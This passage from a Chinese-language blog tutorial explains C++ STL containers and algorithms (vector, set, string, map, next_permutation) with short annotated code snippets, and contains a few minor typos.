class="hljs-comment">//5</span><br></code></pre></div></td></tr></table></figure><hr><h3 id="4-向量，动态数组-vector"><a href="#4-向量，动态数组-vector" class="headerlink" title="4.向量，动态数组(vector)"></a>4.向量，动态数组(vector)</h3><h6 id="1-向量的定义"><a href="#1-向量的定义" class="headerlink" title="1)向量的定义"></a>1)向量的定义</h6><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-built_in">vector</span>&lt;元素类型&gt; 向量名;<br><span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt; a;<br></code></pre></div></td></tr></table></figure><h6 id="2）向量初始化"><a href="#2）向量初始化" class="headerlink" title="2）向量初始化"></a>2）向量初始化</h6><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt; abc;<span class="hljs-comment">//初始化一个size为0的vector，也是最常用的</span><br><span class="hljs-function"><span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt; <span class="hljs-title">abc</span><span class="hljs-params">(<span class="hljs-number">10</span>)</span></span>;<span class="hljs-comment">//初始化了10个默认值为0的元素</span><br><span class="hljs-function"><span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt; <span class="hljs-title">abc</span><span class="hljs-params">(<span class="hljs-number">10</span>,<span class="hljs-number">1</span>)</span></span>;<span class="hljs-comment">//初始化了10个值为1的元素</span><br></code></pre></div></td></tr></table></figure><h6 id="3）向量的常见操作"><a href="#3）向量的常见操作" class="headerlink" title="3）向量的常见操作"></a>3）向量的常见操作</h6><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-number">1.</span>取向量首元素的迭代器<br>向量名.begin();<br></code></pre></div></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-number">2.</span>取向量尾元素下一地址<br>向量名.end();<span class="hljs-comment">//不是最后一个元素，而是最后一个元素的下一个位置。begin和end可以理解成区间中的前闭后开，即[a.begin,a.end),这个区间包括了向量a中的全部元素</span><br></code></pre></div></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-number">3.</span>取向量首元素的值<br>向量名.front();<br></code></pre></div></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-number">4.</span>取向量尾元素的值<br>向量名.back();<br></code></pre></div></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-number">5.</span>下标形式访问<br><span class="hljs-keyword">int</span> a=向量名[t];<span class="hljs-comment">//类似普通数组的访问操作，其中t可以为任何数，但不能超出向量中实际的个数</span><br></code></pre></div></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-number">6.</span>往尾部添加一个元素<br>向量名.push_back(值);<span class="hljs-comment">//最常见操作</span><br></code></pre></div></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-number">7.</span>删除尾部第一个元素<br>向量名.pop_back();<br></code></pre></div></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-number">8.</span>判断向量是否为空<br>向量名.empty();<br></code></pre></div></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-number">9.</span>求向量中元素的个数<br>向量名.size();<span class="hljs-comment">//实际元素的个数，不是容量</span><br></code></pre></div></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-number">10.</span>翻转向量<br>reverse(a.begin() , a.end());<span class="hljs-comment">//a为向量名</span><br></code></pre></div></td></tr></table></figure><h6 id="4）向量的经典应用"><a href="#4）向量的经典应用" class="headerlink" title="4）向量的经典应用"></a>4）向量的经典应用</h6><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-number">1.</span>邻接表<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">edge</span>&#123;</span><span class="hljs-keyword">int</span> from,to,value;&#125;<br><span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> maxn=<span class="hljs-number">1e5</span>;<br><span class="hljs-built_in">vector</span>&lt;edge&gt; Map[maxn];<span class="hljs-comment">//一维向量相当于二维数组</span><br>若用普通二维数组存邻接表，会造成极大浪费(超内存)<br><span class="hljs-comment">//初始化，clear函数是清空向量，不是变成0</span><br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;maxn;++i) Map[i].clear();<br></code></pre></div></td></tr></table></figure><hr><h3 id="5-集合-set"><a href="#5-集合-set" class="headerlink" title="5.集合(set)"></a>5.集合(set)</h3><h6 id="数学上的集合的三个特征"><a href="#数学上的集合的三个特征" class="headerlink" title="数学上的集合的三个特征"></a>数学上的集合的三个特征</h6><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-number">1.</span>确定性(任一元素必须是确定属于或不属于某个集合)<br><span class="hljs-number">2.</span>互异性(集合中的元素互不相同)<br><span class="hljs-number">3.</span>无序性(集合中的元素没有先后之分)<br></code></pre></div></td></tr></table></figure><h6 id="1）特点-3"><a href="#1）特点-3" class="headerlink" title="1）特点"></a>1）特点</h6><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-built_in">set</span>的含义就是集合，是一个有序的，没有相同元素的容器，且里面的元素都是排序好的，支持插入，删除，查找等操作，所有的操作都是严格在logn时间内完成，效率非常高<br></code></pre></div></td></tr></table></figure><h6 id="2）常见操作-3"><a href="#2）常见操作-3" class="headerlink" title="2）常见操作"></a>2）常见操作</h6><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-number">1.</span><span class="hljs-built_in">set</span>的声明<br><span class="hljs-built_in">set</span>&lt;<span class="hljs-keyword">int</span>&gt; s;<br></code></pre></div></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-number">2.</span><span class="hljs-built_in">set</span>的清空<br>s.clear();<br></code></pre></div></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-number">3.</span>插入一个元素x<br>s.insert(x);<span class="hljs-comment">//如果集合中之前没有此元素，则成功插入并自动排序，否则不插入</span><br></code></pre></div></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-number">4.</span>查询有否元素x<br><span class="hljs-keyword">int</span> hav = s.count(x); <span class="hljs-comment">//有则返回1，无则返回0</span><br></code></pre></div></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-number">5.</span>查找x并返回迭代器<br><span class="hljs-built_in">set</span>&lt;<span class="hljs-keyword">int</span>&gt;::iterator it = s.find(x);<br></code></pre></div></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-number">6.</span>判断是否为空集<br><span class="hljs-keyword">bool</span> isempty = s.empty();<span class="hljs-comment">//若为空集则返回真，否则返回假</span><br></code></pre></div></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-number">7.</span>求集合元素个数<br><span class="hljs-keyword">int</span> n = s.size();<br></code></pre></div></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-number">8.</span>删除元素x<br>s.erase(x);<br></code></pre></div></td></tr></table></figure><h6 id="3）用法注意"><a href="#3）用法注意" class="headerlink" title="3）用法注意"></a>3）用法注意</h6><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-number">1.</span><span class="hljs-built_in">set</span>最主要用途：自动去重并按升序排序<br><span class="hljs-number">2.</span>如若对<span class="hljs-built_in">set</span>中的元素降序排序，则<br><span class="hljs-built_in">set</span>声明<br>    <span class="hljs-built_in">set</span>&lt;<span class="hljs-keyword">int</span>,greater&lt;<span class="hljs-keyword">int</span>&gt; &gt; st;<br>迭代器也随之改变<br>    <span class="hljs-built_in">set</span>&lt;<span class="hljs-keyword">int</span>,greater&lt;<span class="hljs-keyword">int</span>&gt; &gt;::iterator it;<br>如若<span class="hljs-keyword">int</span>类型改为结构体时，排序就在结构体中加载小于符号<br><span class="hljs-number">3.</span><span class="hljs-built_in">set</span>只能通过迭代器(iterator)访问<br><span class="hljs-number">4.</span><span class="hljs-built_in">set</span>不支持 it &lt; st.end() 的写法，可写成 it != st.end() <br></code></pre></div></td></tr></table></figure><hr><h3 id="6-string类"><a href="#6-string类" class="headerlink" title="6.string类"></a>6.string类</h3><h6 id="1）string对象的声明"><a href="#1）string对象的声明" class="headerlink" title="1）string对象的声明"></a>1）string对象的声明</h6><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-number">1.</span><span class="hljs-built_in">string</span> str;<br><span class="hljs-number">2.</span><span class="hljs-built_in">string</span> strl=<span class="hljs-string">&quot;qwertyuui&quot;</span>;<br></code></pre></div></td></tr></table></figure><h6 id="2）求string对象的长度"><a href="#2）求string对象的长度" class="headerlink" title="2）求string对象的长度"></a>2）求string对象的长度</h6><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-built_in">string</span> strTest=<span class="hljs-string">&quot;test&quot;</span>;<br><span class="hljs-number">1.</span> strTest.length(); <span class="hljs-comment">//结果为4</span><br><span class="hljs-number">2.</span> strTest.size(); <span class="hljs-comment">//结果为4</span><br></code></pre></div></td></tr></table></figure><h6 id="3）string对象的连接"><a href="#3）string对象的连接" class="headerlink" title="3）string对象的连接"></a>3）string对象的连接</h6><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">可以使用+和+=运算符对<span class="hljs-built_in">string</span>对象执行字符串的连接操作(还有append成员函数实现字符串连接，忽略之)<br></code></pre></div></td></tr></table></figure><h6 id="4）string对象的比较"><a href="#4）string对象的比较" class="headerlink" title="4）string对象的比较"></a>4）string对象的比较</h6><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">可以用 &lt;、&lt;=、==、!=、&gt;=、&gt; 运算符比较<span class="hljs-built_in">string</span>对象(还有compare成员函数用于比较字符串，忽略之)<br></code></pre></div></td></tr></table></figure><h6 id="5）求string对象的字串"><a href="#5）求string对象的字串" class="headerlink" title="5）求string对象的字串"></a>5）求string对象的字串</h6><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">substr 成员函数可以用于求字串(n,m)<br>调用时，如果省略m或者m超过了字符串的长度，则求出来的字串就是从下标n开始一直到字符串结束的部分<br><span class="hljs-built_in">string</span> s1=<span class="hljs-string">&quot;this is ok&quot;</span>;<br><span class="hljs-number">1.</span><span class="hljs-built_in">string</span> s2=s1.substr(<span class="hljs-number">2</span>,<span class="hljs-number">4</span>); <span class="hljs-comment">//s2=&quot;is i&quot;</span><br><span class="hljs-number">2.</span>s2=s1.substr(<span class="hljs-number">2</span>);<span class="hljs-comment">// s2=&quot;is is ok&quot;</span><br></code></pre></div></td></tr></table></figure><h6 id="6）插入字符串"><a href="#6）插入字符串" class="headerlink" title="6）插入字符串"></a>6）插入字符串</h6><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">insert 成员函数可以在<span class="hljs-built_in">string</span>对象中插入另一个字符串，返回值为对象自身的引用<br>string s1(&quot;Limitless&quot;), s2(&quot;00&quot;);<br><span class="hljs-number">1.</span> s1.insert(<span class="hljs-number">2</span>,<span class="hljs-string">&quot;123&quot;</span>); <span class="hljs-comment">//&quot;Li123mitless&quot;</span><br><span class="hljs-number">2.</span> s1.insert(<span class="hljs-number">3</span>,s2); <span class="hljs-comment">//s1=&quot;Li10023mitless&quot;</span><br><span class="hljs-number">3.</span> s1.insert(<span class="hljs-number">3</span>,<span class="hljs-number">5</span>,<span class="hljs-string">&#x27;x&#x27;</span>);<span class="hljs-comment">//s1=&quot;Li1xxxxx0023mitless&quot;</span><br></code></pre></div></td></tr></table></figure><h6 id="7）删除字串"><a href="#7）删除字串" class="headerlink" title="7）删除字串"></a>7）删除字串</h6><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">erase 成员函数可以删除<span class="hljs-built_in">string</span>对象中的字串，返回值为对象自身的引用<br><span class="hljs-function"><span class="hljs-built_in">string</span> <span class="hljs-title">s1</span><span class="hljs-params">(<span class="hljs-string">&quot;Real Steel&quot;</span>)</span></span>;<br><span class="hljs-number">1.</span> s1.erase(<span class="hljs-number">1</span>,<span class="hljs-number">3</span>);<span class="hljs-comment">//s1=&quot;R Steel&quot;</span><br><span class="hljs-number">2.</span> s1.erase(<span class="hljs-number">5</span>);<span class="hljs-comment">//s1=&quot;R Ste&quot;</span><br></code></pre></div></td></tr></table></figure><h6 id="8）交换两个string对象的内容"><a href="#8）交换两个string对象的内容" class="headerlink" title="8）交换两个string对象的内容"></a>8）交换两个string对象的内容</h6><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">swap成员函数可以交换两个<span class="hljs-built_in">string</span>对象的内容<br>string s1(&quot;West&quot;),s2(&quot;East&quot;);<br>s1.swap(s2);<span class="hljs-comment">//s1=&quot;East&quot;,s2=&quot;West&quot;</span><br></code></pre></div></td></tr></table></figure><h6 id="9）字符串的查找操作"><a href="#9）字符串的查找操作" class="headerlink" title="9）字符串的查找操作"></a>9）字符串的查找操作</h6><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-built_in">string</span> str=<span class="hljs-string">&quot;The apple thinks apple is delicious&quot;</span>; <span class="hljs-comment">//长度34</span><br><span class="hljs-built_in">string</span> key=<span class="hljs-string">&quot;apple&quot;</span>;<br><span class="hljs-number">1.</span> <span class="hljs-keyword">int</span> pos1=str.find(key);<span class="hljs-comment">//4</span><br>    s.find(str),查找字符串str在当前字符串s中第一次出现的位置<br><span class="hljs-number">2.</span> <span class="hljs-keyword">int</span> pos2=str.find(key,<span class="hljs-number">10</span>);<span class="hljs-comment">//17</span><br>    s.find(str,pos),查找字符串str在当前字符串s的[pos,end]中第一次出现的位置，即从pos开始到字符串的最后，str第一次出现的位置<br></code></pre></div></td></tr></table></figure><h6 id="10）用STL算法操作string对象"><a href="#10）用STL算法操作string对象" class="headerlink" title="10）用STL算法操作string对象"></a>10）用STL算法操作string对象</h6><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-built_in">string</span> <span class="hljs-title">s</span><span class="hljs-params">(<span class="hljs-string">&quot;afgcbed&quot;</span>)</span></span>;<br>sort(s.begin(),s,end());<br><span class="hljs-built_in">cout</span>&lt;&lt;s&lt;&lt;<span class="hljs-built_in">endl</span>;<span class="hljs-comment">//输出abcdefg</span><br>next_permutation(s.begin(),s,end());<br><span class="hljs-built_in">cout</span>&lt;&lt;s&lt;&lt;<span class="hljs-built_in">endl</span>;<span class="hljs-comment">//输出abcdegf</span><br>reverse(s.begin(),s,end());<br><span class="hljs-built_in">cout</span>&lt;&lt;s&lt;&lt;<span class="hljs-built_in">endl</span>;<span class="hljs-comment">//fgedcba</span><br></code></pre></div></td></tr></table></figure><h6 id="11）String其他有用函数"><a href="#11）String其他有用函数" class="headerlink" title="11）String其他有用函数"></a>11）String其他有用函数</h6><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-number">1.</span> 截取子串<br>       s.substr(pos, n)    截取s中从pos开始（包括<span class="hljs-number">0</span>）的n个字符的子串，并返回<br>       s.substr(pos)        截取s中从从pos开始（包括<span class="hljs-number">0</span>）到末尾的所有字符的子串，并返回<br><span class="hljs-number">2.</span> 替换子串<br>       s.replace(pos, n, s1)    用s1替换s中从pos开始（包括<span class="hljs-number">0</span>）的n个字符的子串<br><span class="hljs-number">3.</span> 查找子串<br>       s.find(s1)         查找s中第一次出现s1的位置，并返回（包括<span class="hljs-number">0</span>）<br>       s.rfind(s1)        查找s中最后次出现s1的位置，并返回（包括<span class="hljs-number">0</span>）<br>       s.find_first_of(s1)       查找在s1中任意一个字符在s中第一次出现的位置，并返回（包括<span class="hljs-number">0</span>）<br>       s.find_last_of(s1)       查找在s1中任意一个字符在s中最后一次出现的位置，并返回（包括<span class="hljs-number">0</span>）<br>       s.fin_first_not_of(s1)         查找s中第一个不属于s1中的字符的位置，并返回（包括<span class="hljs-number">0</span>）<br>       s.fin_last_not_of(s1)         查找s中最后一个不属于s1中的字符的位置，并返回（包括<span class="hljs-number">0</span>）<br>       <br><span class="hljs-number">4.</span><span class="hljs-built_in">string</span>转换成<span class="hljs-keyword">char</span>*字符串<br><span class="hljs-number">1</span>) .data();<br>如：<br><span class="hljs-built_in">string</span> str=<span class="hljs-string">&quot;abc&quot;</span>;<br><span class="hljs-keyword">char</span>*p=(<span class="hljs-keyword">char</span>*)str.data();<br><br><span class="hljs-number">2</span>) .c_str();<br>如：<br><span class="hljs-built_in">string</span> str=<span class="hljs-string">&quot;adcd&quot;</span>;<br><span class="hljs-keyword">char</span> *p=(<span class="hljs-keyword">char</span>*)str.c_str();<br><br></code></pre></div></td></tr></table></figure><hr><h3 id="7-映射-map"><a href="#7-映射-map" class="headerlink" title="7.映射(map)"></a>7.映射(map)</h3><h6 id="1）特点-4"><a href="#1）特点-4" class="headerlink" title="1）特点"></a>1）特点</h6><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-built_in">map</span>是一个键值对(key/value)容器，对于迭代器来说，可以修改value，而不能修改key。Map会根据key自动排序<br><span class="hljs-built_in">map</span>类型通常可理解为关联数组：可使用键作为下标来获取一个值。关联的本质在于：元素的值与某个特定的键相关联，而并非通过元素在数组中的位置来获取<br></code></pre></div></td></tr></table></figure><h6 id="2）常见操作-4"><a href="#2）常见操作-4" class="headerlink" title="2）常见操作"></a>2）常见操作</h6><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-number">1.</span><span class="hljs-built_in">map</span>的定义<br><span class="hljs-built_in">map</span>&lt;<span class="hljs-keyword">int</span>,<span class="hljs-built_in">string</span>&gt; m;<span class="hljs-comment">//定义一个空map m;</span><br></code></pre></div></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-number">2.</span>返回m中键值等于k的元素的个数(<span class="hljs-number">1</span>或<span class="hljs-number">0</span>)<br>m.count(k);<br></code></pre></div></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-number">3.</span>查找元素<br>m.find(k);<span class="hljs-comment">//存在则返回指向该元素的迭代器，否则返回结束地址end()</span><br></code></pre></div></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-number">4.</span>删除元素<br>m.erase(k);<span class="hljs-comment">//删除m中键为k的元素，返回删除元素的个数(1或0)</span><br></code></pre></div></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-number">5.</span>删除迭代器指向的元素<br>m.erase(p);<span class="hljs-comment">//从m中删除迭代器p所指向的元素</span><br></code></pre></div></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-number">6.</span>插入元素<br>m.insert(e);<span class="hljs-comment">//e是一个用在m上的value_type类型的值(一个pair)。如果键e.first不在m中，则插入一个值为e.second的新元素；如果该键在m中已存在，那么不进行任何操作</span><br></code></pre></div></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-number">7.</span>清空元素<br>m.clear();<span class="hljs-comment">//清空m</span><br></code></pre></div></td></tr></table></figure><hr><h3 id="8-STL中的算法"><a href="#8-STL中的算法" class="headerlink" title="8.STL中的算法"></a>8.STL中的算法</h3><h6 id="1）全排序-next-permutation"><a href="#1）全排序-next-permutation" class="headerlink" title="1）全排序(next_permutation)"></a>1）全排序(next_permutation)</h6><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">通常用于生成序列的全排列<br><span class="hljs-keyword">int</span> a[]=&#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>&#125;;<br><span class="hljs-keyword">do</span>&#123;<br>    <span class="hljs-built_in">cout</span>&lt;&lt;a[<span class="hljs-number">0</span>]&lt;&lt;<span class="hljs-string">&quot; &quot;</span>&lt;&lt;a[<span class="hljs-number">1</span>]&lt;&lt;<span class="hljs-string">&quot; &quot;</span>&lt;&lt;a[<span class="hljs-number">2</span>]&lt;&lt;<span class="hljs-built_in">endl</span>;<br>&#125;<span class="hljs-keyword">while</span>(next_permutation(a,a+<span class="hljs-number">3</span>))<br><span class="hljs-number">1.</span>若当前调用排序已经达到最大字典序，比如<span class="hljs-number">321</span>，则函数返回<span class="hljs-literal">false</span>;<br><span class="hljs-number">2.</span>修改函数的参数，比如(a,a+<span class="hljs-number">2</span>),则可以只对部分长度全排列<br></code></pre></div></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">next_permutation是如何生成序列的全排列？<br><span class="hljs-number">1.</span>从最右边开始，两两比较相邻的元素，直至找到右边比左边大的一对，左边那个就是将要被替换的，再从最右边开始找比这个元素大的第一个，交换他们两个.<br><span class="hljs-number">2.</span>交换之后，翻转交换元素的后面的所有元素<br><span class="hljs-number">3.</span>比如：<span class="hljs-number">1</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span> <span class="hljs-number">6</span> <span class="hljs-number">5</span> <span class="hljs-number">2</span> =&gt; <span class="hljs-number">1</span> <span class="hljs-number">3</span> <span class="hljs-number">5</span> <span class="hljs-number">6</span> <span class="hljs-number">4</span> <span class="hljs-number">2</span> =&gt; <span class="hljs-number">1</span> <span class="hljs-number">3</span> <span class="hljs-number">5</span> <span class="hljs-number">2</span> <span class="hljs-number">4</span> <span class="hljs-number">6</span><br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
